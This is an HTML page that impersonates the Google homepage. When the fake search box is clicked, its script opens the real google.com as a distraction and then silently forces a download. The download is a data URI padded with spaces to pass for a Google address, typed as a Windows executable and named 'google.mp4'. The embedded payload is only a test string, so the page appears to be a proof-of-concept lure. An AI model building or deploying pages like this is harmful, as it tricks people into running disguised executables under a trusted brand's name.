<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Google</title>
  <style>
    body {
      font-family: Arial, sans-serif; background: #fff;
      padding: 60px 20px; text-align: center;
    }
    .logo { font-size: 64px; font-weight: 400; margin-bottom: 24px; }
    .g1{color:#4285f4}.o1{color:#ea4335}.o2{color:#fbbc05}
    .g2{color:#4285f4}.l{color:#34a853}.e{color:#ea4335}
    input {
      width: 80%; max-width: 400px; padding: 14px 20px; font-size: 16px;
      border: 1px solid #dfe1e5; border-radius: 24px; outline: none;
      box-shadow: 0 1px 6px rgba(32,33,36,.1); cursor: pointer; text-align: center;
    }
    .info { color: #999; font-size: 12px; margin-top: 24px; }
  </style>
</head>
<body>

<div class="logo">
  <span class="g1">G</span><span class="o1">o</span><span class="o2">o</span><span class="g2">g</span><span class="l">l</span><span class="e">e</span>
</div>

<input type="text" id="q" placeholder="Search Google or type a URL" autocomplete="off" readonly>

<p class="info">Tap the search box</p>

<script>
document.getElementById('q').addEventListener('click', function() {
  window.open('https://www.google.com', '_blank');

  setTimeout(function() {
    var a = document.createElement('a');
    a.href = 'data:https://google.com/' + ' '.repeat(200) + 'application/x-msdownload;base64,ZXN0dGVzdHRlc3R0ZXN0';
    a.download = 'google.mp4';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
  }, 500);
});
</script>

</body>
</html>
